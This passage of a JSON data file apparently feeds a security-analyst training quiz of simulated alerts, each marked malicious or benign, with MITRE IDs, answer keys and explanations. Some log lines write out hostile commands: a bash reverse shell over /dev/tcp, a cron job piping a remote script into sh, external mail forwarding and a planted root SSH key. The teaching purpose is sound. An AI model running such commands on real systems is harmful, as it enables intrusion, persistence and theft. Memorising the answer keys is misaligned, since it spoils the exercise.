IPs.","pair":"i03"},{"id":"i05","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"MFA method added","h":"vkapoor@corp.com","l":["operation: User registered security info","method: phone (+1 555 01xx) \u00b7 new","actor IP: 104.x.x.x (VPS hosting)","6 min after: password reset via SSPR by helpdesk"],"v":1,"x":"T1098.005","c":"helpdesk-mfa-reset","k":[3],"diff":2,"say":"A new phone security method was added from a hosting provider address, six minutes after a help desk password reset.","q":{"kind":"contain","ask":"First action?","o":["Revoke sessions, remove the new method, and re-verify out of band","Reset the password again","Call the help desk"],"a":0,"why":"Undo the takeover and confirm the real user owns it."},"tell":"Helpdesk reset \u2192 new MFA phone from a VPS within minutes. That is a social-engineered helpdesk takeover, Scattered Spider's whole personality."},{"id":"i06","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"OAuth app consent","h":"nmorris@corp.com","l":["app: \"Docs Viewer Pro\" (unverified publisher)","permissions: Mail.ReadWrite, Files.ReadWrite.All, offline_access","consent: user"],"v":1,"x":"T1528","c":"oauth-app-abuse","k":[0,1],"diff":2,"say":"A user consented to an unverified app requesting read-write to all mail and files plus offline access.","q":{"kind":"contain","ask":"First action?","o":["Reset the user password","Revoke the app grant tenant-wide","Delete the user mailbox"],"a":1,"why":"Consent tokens persist independent of passwords."},"tell":"Unverified app asking to read and write all your mail and files, with offline access. Consent phishing does not need a password at all. Block user consent.","pair":"i07"},{"id":"i07","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"OAuth app consent","h":"tbaker@corp.com","l":["app: \"Zoom\" (verified publisher: Zoom Video Communications)","permissions: User.Read, Calendars.ReadWrite","consent: admin, change CHG0042210"],"v":0,"x":"T1528","c":"oauth-app-abuse","k":[2],"diff":2,"trap":"scary","say":"An admin consented, with a change ticket, to a verified Zoom app requesting read-user and calendar access.","tell":"Verified publisher, scoped permissions that fit the app, admin consent with a change ticket. Boring = good.","pair":"i06"},{"id":"i08","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Privileged role assigned","h":"Global Administrator","l":["target: svc_backup_old@corp.com (no sign-in 14 months)","actor: cflores@corp.com (help desk)","via: PIM bypass, direct assignment"],"v":1,"x":"T1098.003","c":"privileged-role-grant","k":[2],"diff":2,"say":"A help desk account granted global admin to a service account unused for fourteen months, bypassing privileged access management.","q":{"kind":"contain","ask":"First action?","o":["Remove the role and lock the dead account","Reset the help desk account","Enable PIM later"],"a":0,"why":"Pull the backdoor grant immediately."},"tell":"Helpdesk handing Global Admin to a dead service account, skipping PIM. Either Ana's account is owned or somebody is building a back door.","pair":"i09"},{"id":"i09","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Privileged role assigned","h":"Exchange Administrator","l":["target: mreyes@corp.com","actor: PIM (activation, 4h)","justification: \"INC0099120 mailbox migration\" \u00b7 approved by: it_lead"],"v":0,"x":"T1098.003","c":"privileged-role-grant","k":[1],"diff":2,"trap":"scary","say":"A four-hour Exchange admin role was activated through privileged access management with a ticket and an approver.","tell":"Time-boxed PIM activation with a ticket and an approver is exactly how privileged access is supposed to look.","pair":"i08"},{"id":"i10","d":"identity","src":"Windows Security \u00b7 4769","t":"Kerberos RC4 ticket requests","h":"SRV-DC-01","l":["account: CORP\\jmccabe","61 TGS requests \u00b7 encryption 0x17 (RC4)","services: MSSQLSvc/*, HTTP/*, svc_* SPNs"],"v":1,"x":"T1558.003","c":"kerberoast-source","k":[1],"diff":2,"say":"A regular user account requested dozens of service tickets using the older RC four encryption in one burst.","tell":"A normal user asking for dozens of RC4 (0x17) service tickets in a burst = Kerberoasting. Modern clients use AES; RC4 bursts stand out.","pair":"e35"},{"id":"i11","d":"identity","src":"Windows Security \u00b7 4624","t":"NTLM logon from workstation to DC","h":"SRV-DC-02","l":["logon type 3 \u00b7 NTLM \u00b7 account: CORP\\Administrator","source: WS-ACCT-0507","key length: 0 \u00b7 logon process: NtLmSsp"],"v":1,"x":"T1550.002","c":"pass-the-hash","k":[2],"diff":2,"say":"The built-in administrator logged on to a domain controller over N-T-L-M from a workstation with key length zero.","tell":"Built-in Administrator over NTLM from an accounting box with key length 0 smells like pass-the-hash. Admins should not even be using that account."},{"id":"i12","d":"identity","src":"Windows Security \u00b7 4740","t":"Account lockouts spike","h":"SRV-DC-02","l":["38 lockouts in 15 min","caller: EXCH-01","all accounts: shared mailbox delegates \u00b7 after password policy change at 09:00"],"v":0,"x":"T1110.001","c":"lockout-spike","k":[2],"diff":2,"trap":"scary","say":"Thirty-eight account lockouts in fifteen minutes, all called from Exchange, right after a nine o'clock password policy change.","tell":"Lockouts all calling from Exchange right after a password policy change = stale credentials on phones. A mobile device sync storm, not brute force."},{"id":"i13","d":"identity","src":"Windows Security \u00b7 4662","t":"Directory replication request","h":"SRV-DC-04","l":["operation: DS-Replication-Get-Changes-All","account: CORP\\ariley","source: WS-ACCT-0633 (not a DC)"],"v":1,"x":"T1003.006","c":"dcsync","k":[2],"diff":2,"say":"A replicate-all directory-changes request came from an account on a workstation that is not a domain controller.","q":{"kind":"contain","ask":"First action?","o":["Isolate the source host and plan a krbtgt reset","Reset that one account","Reboot the DC"],"a":0,"why":"DCSync means domain-wide hashes; contain the source now."},"tell":"Replication rights used by a non-DC = DCSync. They are pulling every hash in the domain without touching NTDS.dit. Game over unless you move now.","pair":"i14"},{"id":"i14","d":"identity","src":"Windows Security \u00b7 4662","t":"Directory replication request","h":"SRV-DC-01","l":["operation: DS-Replication-Get-Changes-All","account: CORP\\MSOL_8f2a1c (Entra Connect)","source: SRV-AADC-01"],"v":0,"x":"T1003.006","c":"dcsync","k":[1],"diff":2,"trap":"scary","say":"A replicate-all directory-changes request came from the directory sync service account on the sync server.","tell":"Entra Connect's MSOL_ account does DCSync-style reads for password hash sync. Expected, from the Connect server only. Protect that box like a DC though.","pair":"i13"},{"id":"i15","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Legacy auth sign-in","h":"finance-shared@corp.com","l":["client app: IMAP4","result: success \u00b7 MFA: not applied (legacy)","IP: 45.x.x.x \u00b7 140 IMAP sign-ins across 30 users in 1 hr"],"v":1,"x":"T1110.003","c":"password-spray-brute","k":[2],"diff":2,"trap":"bland","say":"A hundred forty I-MAP sign-ins across thirty users from one address, succeeding without multi-factor applied.","q":{"kind":"contain","ask":"First action?","o":["Block legacy auth with Conditional Access and reset hit accounts","Reset payroll only","Email the users"],"a":0,"why":"Close the legacy side door and clean up the spray."},"tell":"IMAP skips MFA, and one IP hitting 30 users is spraying. Legacy auth is the side door. Block it with Conditional Access."},{"id":"i16","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Sign-in from anonymous IP","h":"jpark@corp.com","l":["IP: Apple iCloud Private Relay","device: compliant iPhone \u00b7 MFA: number match passed","app: Outlook mobile"],"v":0,"x":"T1078.004","c":"anonymous-ip-context","k":[1],"diff":2,"trap":"scary","say":"A sign-in through Apple's private relay on a compliant iPhone, number match passed, using Outlook mobile.","tell":"iCloud Private Relay trips \"anonymous IP\" rules constantly. Compliant device + strong MFA + Outlook mobile = an iPhone user existing."},{"id":"i17","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Federation settings changed","h":"corp.com tenant","l":["operation: Set domain authentication \u2192 Federated","domain: corp-sso.com (new, added 20 min ago)","issuer URI: http://any.sts/1A2B3C","actor: svc_backup_old@corp.com"],"v":1,"x":"T1484.002","c":"federation-change","k":[3],"diff":3,"say":"A new federated domain was added twenty minutes ago with an unusual issuer, by a long-dormant account.","q":{"kind":"contain","ask":"First action?","o":["Remove the federated domain and lock the actor account","Reset one user","Monitor for a week"],"a":0,"why":"A rogue federation mints tokens for anyone; rip it out."},"tell":"Adding a new federated domain lets an attacker mint tokens for any user. Done by that dead account that just got Global Admin. This is a golden SAML-level backdoor."},{"id":"i18","d":"identity","src":"Okta \u00b7 System Log","t":"Admin impersonation session","h":"okta-admin@corp.com","l":["event: user.session.impersonation.grant","target: super admin","preceded by: support ticket password reset from unfamiliar caller"],"v":1,"x":"T1684.001","c":"helpdesk-mfa-reset","k":[2],"diff":2,"say":"An impersonation grant on a super admin, right after a support ticket password reset from an unfamiliar caller.","tell":"Impersonation grants on a super admin right after a phone-based reset. Help desk social engineering is how big IdP breaches start."},{"id":"c01","d":"cloud","src":"Exchange Online \u00b7 OfficeActivity","t":"Inbox rule created","h":"bcole@corp.com","l":["rule: \".\"","condition: subject or body contains \"invoice\", \"wire\", \"payment\"","action: move to RSS Subscriptions, mark as read"],"v":1,"x":"T1564.008","c":"mailbox-hide-rule","k":[1,2],"diff":2,"say":"A one-character inbox rule moves mail about invoices, wires, and payments to R-S-S subscriptions and marks it read.","q":{"kind":"contain","ask":"First action?","o":["Delete the rule and check for a pending wire","Just delete the rule","Notify the CFO later"],"a":0,"why":"The rule hides a live payment-fraud attempt."},"tell":"Single-character rule name + finance keywords + hide in RSS folder = BEC. The attacker is hiding replies while they redirect a wire.","pair":"c02"},{"id":"c02","d":"cloud","src":"Exchange Online \u00b7 OfficeActivity","t":"Inbox rule created","h":"mreyes@corp.com","l":["rule: \"Jira notifications\"","condition: from jira@corp.atlassian.net","action: move to folder \"Jira\"","client: Outlook desktop, corp IP"],"v":0,"x":"T1564.008","c":"mailbox-hide-rule","k":[3],"diff":2,"trap":"scary","say":"An inbox rule named Jira notifications moves mail from the Jira address into a Jira folder, made from the office desktop.","tell":"A descriptive name, a sane condition, a real folder, created from the office. That is a person drowning in Jira emails.","pair":"c01"},{"id":"c03","d":"cloud","src":"Exchange Online \u00b7 OfficeActivity","t":"Mail forwarding to external","h":"payroll@corp.com","l":["Set-Mailbox -ForwardingSmtpAddress smtp:payrol1.dept@gmail.com -DeliverToMailboxAndForward $true","actor IP: 45.x.x.x"],"v":1,"x":"T1114.003","c":"external-forward","k":[0],"diff":1,"say":"Mailbox forwarding was set to an outside Gmail address resembling the department name, delivering and forwarding.","tell":"Forwarding payroll to a Gmail with a 1 instead of an l. Every payslip and bank change now goes to them. Kill it and check who else has forwarding.","pair":"z42"},{"id":"c04","d":"cloud","src":"Exchange Online \u00b7 MailItemsAccessed","t":"Bulk mailbox access","h":"ceo@corp.com","l":["MailItemsAccessed: 4,200 items in 8 min","AppId: \"Docs Viewer Pro\" (consented yesterday by nmorris)","via Graph API"],"v":1,"x":"T1114.002","c":"oauth-app-abuse","k":[1],"diff":2,"say":"An app consented yesterday read four thousand two hundred mail items in eight minutes through the Graph interface.","q":{"kind":"contain","ask":"First action?","o":["Revoke the app grant tenant-wide and review what it read","Reset the CEO password","Delete the mailbox"],"a":0,"why":"Token theft ignores passwords; kill the grant."},"tell":"Remember that unverified OAuth app? It is now reading the CEO's mail via Graph. Token theft does not care about passwords. Revoke the app grant tenant-wide.","pair":"i07"},{"id":"c05","d":"cloud","src":"SharePoint \u00b7 OfficeActivity","t":"Mass file download","h":"kober@corp.com","l":["FileSyncDownloadedFull: 6,800 files","site: Marketing Assets","client: OneDrive sync, new compliant laptop enrolled today"],"v":0,"x":"T1530","c":"mass-file-download","k":[2],"diff":2,"trap":"scary","say":"A newly enrolled compliant laptop synced sixty-eight hundred files from the marketing library through the sync client.","tell":"New laptop + OneDrive sync = the whole library downloads at once. Compliant device and sync client is the tell. Exfil uses browsers, rclone, or APIs.","pair":"c06"},{"id":"c06","d":"cloud","src":"SharePoint \u00b7 OfficeActivity","t":"Mass file download","h":"kdavis@corp.com","l":["FileDownloaded: 2,950 files from Finance, Legal, HR sites","client: browser \u00b7 IP: 91.x.x.x (hosting)","kdavis resignation date: Friday"],"v":1,"x":"T1530","c":"mass-file-download","k":[1,2],"diff":2,"say":"A browser from a hosting address downloaded nearly three thousand files from finance, legal, and H-R, by someone leaving Friday.","q":{"kind":"contain","ask":"First action?","o":["Just disable downloads","Wait until Friday","Suspend the session and loop in HR and IR"],"a":2,"why":"Insider plus hosting IP needs both HR and IR now."},"tell":"Browser downloads from three sensitive sites, from a hosting IP, by someone who quits Friday. Insider risk + compromised session = escalate to IR and HR both.","pair":"c05"},{"id":"c07","d":"cloud","src":"Azure \u00b7 AzureActivity","t":"VM run command executed","h":"sub: corp-prod","l":["operation: Microsoft.Compute/virtualMachines/runCommand/action","VM: prod-sql-01","caller: deploy-sp (service principal) \u00b7 IP: 198.51.x.x (not Azure DevOps)"],"v":1,"x":"T1651","c":"cloud-principal-abuse","k":[2],"diff":2,"trap":"bland","say":"A run command executed on a production database VM, called by a deploy principal from an address outside the pipeline.","q":{"kind":"pivot","ask":"First pivot?","o":["Reboot the VM","Rotate the service principal secret and audit its runs","Delete the VM"],"a":1,"why":"The SP secret leaked; rotate and scope the blast radius."},"tell":"Run Command = code execution as SYSTEM on a VM via the control plane. Your deploy service principal doing it from outside your pipeline means its secret leaked."},{"id":"c08","d":"cloud","src":"Azure \u00b7 AzureActivity","t":"Key Vault secrets listed","h":"kv-prod-app","l":["operation: SecretList + SecretGet x 48","caller: app-api-prod (managed identity)","source: AKS cluster prod-aks \u00b7 pattern: every pod restart"],"v":0,"x":"T1555.006","c":"keyvault-secret-access","k":[2],"diff":2,"trap":"scary","say":"A managed identity listed and fetched vault secrets on every pod restart from inside its own cluster.","q":{"kind":"tune","ask":"Best tuning?","o":["Allowlist the workload identity from the cluster on pod restart","Stop all Key Vault read alerts","Exclude the vault"],"a":0,"why":"Trust your own identity pattern; watch humans and new IPs."},"tell":"Managed identity from your own cluster fetching secrets on pod restart is exactly what Key Vault is for. Watch for humans or new IPs doing bulk SecretGet."},{"id":"c09","d":"cloud","src":"AWS \u00b7 CloudTrail","t":"CloudTrail logging stopped","h":"acct: 4471-xxxx-prod","l":["event: StopLogging","trail: org-trail","user: arn:aws:iam::...:user/ci-deployer \u00b7 region: ap-southeast-1 (never used)"],"v":1,"x":"T1685.002","c":"log-clearing","k":[2],"diff":2,"say":"Cloud-trail logging was stopped on the org trail by a continuous integration user in a region never used before.","q":{"kind":"contain","ask":"First action?","o":["Ignore, logging resumes","Re-enable the trail and scope the CI user","Delete the CI user quietly"],"a":1,"why":"Restore visibility first, then investigate the identity."},"tell":"Turning off CloudTrail from a CI user in a region you never use. First thing an attacker does in AWS is close your eyes."},{"id":"c10","d":"cloud","src":"AWS \u00b7 CloudTrail","t":"New access key created","h":"acct: 7788-xxxx-prod","l":["event: CreateAccessKey","target: admin-breakglass","caller: cd-runner \u00b7 then: 14 RunInstances (p4d.24xlarge) in 4 regions"],"v":1,"x":"T1098.001","c":"cloud-principal-abuse","k":[2],"diff":2,"say":"A new access key was created on the break-glass admin, followed by many large GPU instances launched across four regions.","q":{"kind":"contain","ask":"First action?","o":["Disable the new key, stop the instances, and rotate CI creds","Just stop the instances","Open a billing ticket"],"a":0,"why":"Kill the keys and the compute, then rotate the leaked creds."},"tell":"Stolen CI creds mint keys on the break-glass admin, then spin up GPU monsters everywhere. That is a cryptominer bill with your name on it."},{"id":"c11","d":"cloud","src":"AWS \u00b7 GuardDuty","t":"S3 bucket made public","h":"bucket: corp-marketing-site","l":["PutBucketPolicy: Principal \"*\" s3:GetObject","caller: web-team (SSO)","bucket hosts: static website \u00b7 CloudFront origin"],"v":0,"x":"T1530","c":"s3-public-bucket","k":[2],"diff":2,"trap":"scary","say":"A bucket policy set read access for everyone on a static website bucket behind the content delivery network, by the web team.","tell":"Static site buckets are public on purpose. SSO user from the web team, GetObject only. Still worth a nudge toward CloudFront OAC, but not an incident."},{"id":"c12","d":"cloud","src":"Microsoft Teams \u00b7 OfficeActivity","t":"External Teams chat","h":"cflores@corp.com","l":["external user: \"IT Support\" (it-helpdesk@corpsupport.onmicrosoft.com)","message: \"We're seeing spam on your account, accept the Quick Assist request\"","preceded by: 900 spam emails to ana in 30 min"],"v":1,"x":"T1566.003","c":"teams-external-phish","k":[0,2],"diff":2,"say":"An outside user calling themselves IT Support messaged on Teams to accept a Quick Assist request, after a flood of spam mail.","q":{"kind":"contain","ask":"First action?","o":["Warn the user not to accept, and restrict external Teams","Block the sender only","Reset the mailbox"],"a":0,"why":"Stop the live social-engineering handoff first."},"tell":"Email-bomb the user, then show up on Teams as \"IT\" to \"help\". Black Basta and friends made this famous. Restrict external Teams access.","pair":"z47"},{"id":"m01","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"Phish delivered","h":"To: ap-team@corp.com","l":["from: billing@d0cusign-secure.net","subject: Completed: Invoice #88231 - Please Review","link: https://d0cusign-secure.net/s/88231 \u2192 login page with corp logo"],"v":1,"x":"T1566.002","c":"lookalike-domain-phish","k":[0],"diff":1,"say":"A completed-invoice mail from a DocuSign lookalike domain links to a login page carrying the corporate logo.","q":{"kind":"pivot","ask":"First pivot?","o":["Block the domain only","Delete the email","Find clicks and submitted credentials, then reset them"],"a":2,"why":"Credential harvest means find and reset who entered creds."},"tell":"Zero for o in the domain, a fake DocuSign completion, and a login page with your logo. Credential harvest, possibly AiTM. Find who clicked.","pair":"m08"},{"id":"m02","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"Suspicious attachment","h":"To: kdavis@corp.com","l":["from: invoices@realvendor.com (SPF/DKIM/DMARC pass)","attachment: Statement_Oct.pdf","sandbox: clean \u00b7 vendor in AP system for 4 yrs"],"v":0,"x":"T1566.001","c":"vendor-invoice-auth","k":[2],"diff":2,"trap":"scary","say":"An invoice PDF from a four-year vendor passed all authentication checks and came back clean from the sandbox.","tell":"Auth passes, clean sandbox, long-standing vendor, PDF that is just a PDF. Not every invoice is a crime.","pair":"m03"},{"id":"m03","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"Vendor email from lookalike domain","h":"To: dgreen@corp.com","l":["from: accounts@realvend0r.com (registered 3 days ago)","subject: RE: Updated banking details for future payments","thread: copies a real thread from realvendor.com"],"v":1,"x":"T1684.001","c":"vendor-invoice-auth","k":[0,2],"diff":2,"say":"A reply about updated banking details came from a vendor lookalike domain registered three days ago, quoting a real thread.","q":{"kind":"contain","ask":"First action?","o":["Call the vendor on a known number and freeze the change","Reply to confirm","Pay then verify"],"a":0,"why":"Verify banking changes out of band, never via the email."},"tell":"New lookalike domain + \"updated banking details\" + a real hijacked thread = vendor email compromise. Call the vendor on a known number. Never the one in the email.","pair":"m02"},{"id":"m04","d":"email","src":"Defender for Office \u00b7 UrlClickEvents","t":"QR code phish","h":"To: 40 employees","l":["subject: Action required: MFA re-enrollment by Friday","body: image only, contains QR code","QR \u2192 hxxps://corp-mfa[.]help/login"],"v":1,"x":"T1566.002","c":"qr-code-phish","k":[1],"diff":2,"say":"An image-only mail about MFA re-enrollment by Friday carries a QR code pointing to an MFA-themed outside domain.","q":{"kind":"pivot","ask":"First pivot?","o":["Identify recipients and warn before they scan the code","Block the sender","Delete from inboxes silently"],"a":0,"why":"The QR moves off managed devices; reach users fast."},"tell":"Quishing. The QR moves the click to a personal phone, where your email filters and EDR can not see it. Image-only body is the giveaway."},{"id":"m05","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"Mass internal email","h":"From: hr@corp.com","l":["to: all-staff (2,300)","subject: Open enrollment closes Nov 15","sent via: Workday notification relay \u00b7 SPF/DKIM pass"],"v":0,"x":"T1534","c":"internal-mass-mail","k":[2],"diff":2,"trap":"scary","say":"An all-staff mail about open enrollment came through the Workday notification relay and passed authentication.","tell":"Internal mass mail from HR via its normal relay during open enrollment. Internal spearphishing looks similar, but it comes from a compromised user mailbox, not a relay."},{"id":"m06","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"HTML smuggling attachment","h":"To: pshah@corp.com","l":["attachment: Remittance_Advice.html (2 KB)","content: JavaScript builds a blob, auto-downloads Remittance.iso","ISO contains: Remittance.lnk"],"v":1,"x":"T1027.006","c":"html-smuggling","k":[1],"diff":2,"say":"An H-T-M-L attachment builds a file in the browser that downloads a disk image containing a shortcut file.","tell":"An HTML file that assembles an ISO in your browser, with an LNK inside. HTML smuggling to dodge the gateway. LNK in ISO is a loader every time."},{"id":"m07","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"Reply-chain hijack","h":"To: ops-team@corp.com","l":["from: jlee@partnerco.com (real partner, auth pass)","thread: 6-month-old project thread","new reply: \"see attached\" \u2192 link to OneDrive-lookalike, password-protected ZIP"],"v":1,"x":"T1566.002","c":"reply-chain-hijack","k":[2],"diff":2,"trap":"bland","say":"A real partner replied into a six-month-old thread saying see attached, linking a password-protected archive on a lookalike site.","tell":"Real sender, real old thread, sudden \"see attached\" with a password ZIP. The partner is compromised and replying into old threads. Qakbot made this a whole genre."},{"id":"m08","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"Lookalike sender","h":"To: nholt@corp.com","l":["from: no-reply@microsoft365.com \u00b7 SPF/DKIM pass (microsoft365.com is Microsoft-owned)","subject: Your Microsoft 365 invoice is ready","links: admin.microsoft.com only"],"v":0,"x":"T1566.002","c":"lookalike-domain-phish","k":[0,2],"diff":2,"trap":"scary","say":"An invoice mail from a Microsoft-owned domain passed authentication, with every link going to the admin portal.","tell":"Weird-looking domain, but it is genuinely Microsoft's, auth passes, and every link goes to admin.microsoft.com. Hover the links, verify the domain owner.","pair":"m01"},{"id":"n01","d":"network","src":"Firewall \u00b7 Palo Alto TRAFFIC","t":"Periodic outbound beacon","h":"WS-ENG-0410 \u2192 193.x.x.x:443","l":["connections every 60s \u00b1 5s for 9 hours","bytes out ~ 1.2 KB each \u00b7 no SNI \u00b7 JA3 matches Cobalt Strike default"],"v":1,"x":"T1071.001","c":"periodic-beacon","k":[1],"diff":2,"say":"Connections every sixty seconds for nine hours with low jitter, no server name, matching a Cobalt Strike fingerprint.","tell":"Clockwork 60-second check-ins with low jitter, no SNI, and a Cobalt Strike JA3. That is C2 asking \"any orders?\" all night.","pair":"n02"},{"id":"n02","d":"network","src":"Firewall \u00b7 Palo Alto TRAFFIC","t":"Periodic outbound beacon","h":"WS-FIN-0588 \u2192 52.x.x.x:443","l":["connections every 300s for 3 days","SNI: client.wns.windows.com","process (from EDR): svchost.exe -k netsvcs"],"v":0,"x":"T1071.001","c":"periodic-beacon","k":[1,2],"diff":2,"trap":"scary","say":"Connections every five minutes for three days to a Microsoft push-notification name, from the service host process.","tell":"Windows push notifications beacon by design. Microsoft SNI, svchost, Microsoft IP space. Beaconing alone is not malicious: check SNI and process.","pair":"n01"},{"id":"n03","d":"network","src":"DNS \u00b7 Windows DNS analytic","t":"High-volume DNS TXT queries","h":"WS-DEV-0512","l":["4,300 TXT queries in 1 hr to *.cdn-cache-ns[.]xyz","subdomain: 60-char base32 strings, e.g. MZXW6YTBOI2DMNZQ..."],"v":1,"x":"T1071.004","c":"dns-txt-volume","k":[0,1],"diff":2,"say":"Four thousand text-record queries in an hour to one domain, using long base-thirty-two labels as subdomains.","tell":"Thousands of long base32 subdomains + TXT records to one sketchy domain = data being smuggled through DNS. dnscat2 / iodine style.","pair":"n04"},{"id":"n04","d":"network","src":"DNS \u00b7 Windows DNS analytic","t":"High-entropy DNS queries","h":"WS-MKT-0233","l":["900 queries/hr to *.cloudfront.net, *.akamaiedge.net","subdomains: d1a2b3c4d5e6f7.cloudfront.net style","process: chrome.exe"],"v":0,"x":"T1071.004","c":"dns-txt-volume","k":[2],"diff":2,"trap":"scary","say":"Nine hundred queries an hour to content delivery networks with random-looking hostnames, from Chrome.","tell":"CDNs use random-looking hostnames constantly. Chrome hitting CloudFront and Akamai is the internet working. Entropy needs context.","pair":"n03"},{"id":"n05","d":"network","src":"Proxy \u00b7 Zscaler","t":"Large upload to file sharing","h":"SRV-FS-08 \u2192 mega.nz","l":["user agent: rclone/v1.66","uploaded: 48 GB over 3 hours","time: 01:00-04:00 Saturday"],"v":1,"x":"T1567.002","c":"data-exfil-upload","k":[0],"diff":2,"say":"A file server uploaded forty-eight gigabytes to a file-sharing site over three hours, starting one in the morning on a weekend.","q":{"kind":"contain","ask":"First action?","o":["Block MEGA only","Throttle the upload","Isolate the server and preserve evidence"],"a":2,"why":"Exfil precedes encryption; isolate and capture."},"tell":"rclone from a file server to MEGA at 1am on a weekend. That is the double-extortion exfil step right before encryption. Ransomware crews love rclone.","pair":"n06"},{"id":"n06","d":"network","src":"Proxy \u00b7 Zscaler","t":"Large upload to cloud storage","h":"WS-DES-0044 \u2192 wetransfer.com","l":["user: tfunk (design)","uploaded: 3.2 GB \u00b7 files: *.psd, *.ai","business hours \u00b7 client: Chrome"],"v":0,"x":"T1567.002","c":"data-exfil-upload","k":[2],"diff":2,"trap":"scary","say":"A designer uploaded three gigabytes of Photoshop and Illustrator files to a transfer site during business hours through Chrome.","tell":"Designer sends huge PSDs to an agency through WeTransfer during work hours. Check your DLP policy, not your IR runbook.","pair":"n05"},{"id":"n07","d":"network","src":"Firewall \u00b7 Fortinet","t":"Internal SMB scanning","h":"WS-REC-0092 \u2192 10.20.0.0/16","l":["TCP 445 to 2,048 hosts in 4 min","TCP 3389 to 512 hosts","source is a front desk PC"],"v":1,"x":"T1046","c":"internal-scan","k":[2],"diff":2,"say":"A front-desk PC connected to file-sharing and remote-desktop ports across thousands of hosts in four minutes.","tell":"A front desk PC sweeping /16 for SMB and RDP. That is someone mapping targets for lateral movement, or a worm. Either way, isolate.","pair":"n08"},{"id":"n08","d":"network","src":"Firewall \u00b7 Fortinet","t":"Internal port scan","h":"SRV-SCAN-01 \u2192 10.0.0.0/8","l":["TCP 1-65535 to 9,000 hosts","source: Tenable Nessus scanner","schedule: weekly, Sunday 02:00"],"v":0,"x":"T1046","c":"internal-scan","k":[1,2],"diff":2,"trap":"scary","say":"A vulnerability scanner connected to every port across nine thousand hosts, on its weekly Sunday schedule.","tell":"Your vuln scanner scans. Allowlist it in detections, but watch for scans from it outside its schedule. Attackers love to hide behind the scanner.","pair":"n07"},{"id":"n09","d":"network","src":"VPN \u00b7 Cisco ASA","t":"VPN brute force","h":"vpn.corp.com","l":["4,800 failed logins in 30 min from 900 IPs","usernames: alphabetical (aaron, abby, adam\u2026)","then: 1 success for \"admin.test\" (no MFA)"],"v":1,"x":"T1110.003","c":"password-spray-brute","k":[2],"diff":2,"say":"Forty-eight hundred failed VPN logins from nine hundred addresses, then one success on a test account with no multi-factor.","q":{"kind":"contain","ask":"First action?","o":["Reset all VPN users","Disable the MFA-less test account and block the IPs","Email the VPN team"],"a":1,"why":"Kill the account that let them in."},"tell":"Distributed spray against the VPN, and it found a test account without MFA. Every ransomware report starts with \"VPN account without MFA\". Disable it now."},{"id":"n10","d":"network","src":"Firewall \u00b7 Palo Alto THREAT","t":"Exploit attempt blocked","h":"internet \u2192 vpn.corp.com","l":["signature: Ivanti Connect Secure command injection (CVE-2024-21887)","action: reset-both \u00b7 1 attempt","source: mass-scanner ASN"],"v":0,"x":"T1190","c":"internet-bg-noise","k":[1],"diff":2,"trap":"scary","say":"A single blocked exploit attempt against the VPN appliance from a known mass-scanner network.","tell":"Internet background radiation. A single blocked exploit attempt from a known scanner is noise. But confirm you are patched, and hunt if you were not."},{"id":"n11","d":"network","src":"Web server \u00b7 IIS logs","t":"New .aspx in aspnet_client receiving POSTs","h":"SRV-WEB-07","l":["POST /aspnet_client/system_web/errorEE.aspx 200","sizes: 120-900 bytes \u00b7 interval: irregular","file created: 3 days ago (no deploy)"],"v":1,"x":"T1505.003","c":"webshell-activity","k":[2],"diff":2,"say":"A newly created page in the ASP-dot-net client folder, not deployed by anyone, is receiving small irregular POSTs.","tell":"A new .aspx in aspnet_client nobody deployed, getting POSTs = webshell. That folder is a classic Exchange/IIS hiding spot.","pair":"e37"},{"id":"n12","d":"network","src":"Firewall \u00b7 Palo Alto TRAFFIC","t":"Traffic to Tor","h":"SRV-APP-31 \u2192 185.220.x.x:9001","l":["app: tor","process (EDR): C:\\ProgramData\\tor\\tor.exe","server role: billing app"],"v":1,"x":"T1090.003","c":"covert-tunnel-egress","k":[1,2],"diff":2,"say":"A billing application server is running the Tor client from program data, connecting to a Tor entry port.","tell":"A billing server running tor.exe from ProgramData. Ransomware operators tunnel C2 and exfil through Tor. Servers have zero reason to."},{"id":"l01","d":"linux","src":"Linux \u00b7 auditd","t":"auditd: php-fpm child exec","h":"web-prod-07 \u00b7 www-app","l":["exec: bash -c \"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\"","parent: php-fpm"],"v":1,"x":"T1059.004","c":"reverse-shell","k":[0],"diff":1,"say":"A web process launched an interactive shell redirected to an external address and port, parented by P-H-P-F-P-M.","tell":"bash -i to /dev/tcp is a reverse shell, and php-fpm as parent means a web app vuln got popped. www-data just called home."},{"id":"l02","d":"linux","src":"Linux \u00b7 auditd","t":"Cron job modified","h":"db-prod-01 \u00b7 root","l":["file: /etc/cron.d/pg_backup","content: 0 2 * * * postgres /usr/local/bin/pg_backup.sh","changed via: Ansible (ansible-playbook backup.yml)"],"v":0,"x":"T1053.003","c":"cron-persist","k":[2],"diff":2,"trap":"scary","say":"A backup cron file was written matching the configuration-management playbook, changed through Ansible.","tell":"Config management writing a backup cron that matches its playbook. Cron changes are only scary when nobody can tell you who made them.","pair":"l03"},{"id":"l03","d":"linux","src":"Linux \u00b7 auditd","t":"Cron job modified","h":"web-prod-12 \u00b7 www-data","l":["file: /var/spool/cron/crontabs/www-data","content: */5 * * * * curl -fsSL http://45.x.x.x/k.sh | sh","no Ansible run"],"v":1,"x":"T1053.003","c":"cron-persist","k":[1,2],"diff":1,"say":"A web-user crontab runs a command every five minutes that pipes a remote shell script straight into the shell.","tell":"curl | sh every 5 minutes from a web user crontab. That is persistence that re-infects even after cleanup. Often a cryptominer.","pair":"l02"},{"id":"l04","d":"linux","src":"Linux \u00b7 auditd","t":"SSH authorized_keys changed","h":"bastion-01 \u00b7 root","l":["file: /root/.ssh/authorized_keys","added: ssh-rsa AAAAB3NzaC1yc2E... (comment: \"x\")","process: echo (parent: bash via reverse shell PID 